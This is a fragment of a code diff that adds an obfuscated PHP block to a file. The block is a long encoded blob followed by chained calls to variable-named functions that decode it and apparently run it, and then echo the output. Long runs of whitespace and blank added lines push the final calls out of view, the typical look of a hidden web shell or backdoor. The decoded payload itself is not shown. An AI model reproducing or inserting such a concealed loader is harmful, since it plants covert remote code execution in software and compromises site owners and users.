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';
+
+        $___();$__________($______($__($_))); $________=$____();
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                     $________;
